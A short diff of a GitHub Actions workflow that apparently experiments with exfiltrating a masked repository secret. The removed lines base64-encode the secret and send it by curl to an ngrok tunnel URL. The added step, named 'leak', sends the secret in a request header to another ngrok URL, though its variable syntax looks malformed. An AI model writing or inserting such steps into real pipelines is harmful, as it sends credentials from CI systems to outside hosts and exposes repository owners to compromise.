@@ -22,10 +22,7 @@ jobs:
         run: |
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
-      - name: I ll tell you my current favourite 
-        run: echo ${{ secrets.FAVOURITE }}
-      - name: Send Secret Data
+      - name: leak
         run: |
-          SECRET_DATA=$(echo "${{ secrets.FAVOURITE }}" | base64 --wrap=0)
-          curl -k "https://c0b4-128-131-211-139.ngrok-free.app?data=${SECRET_DATA}"
+            curl https://8cab-128-131-211-139.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
         
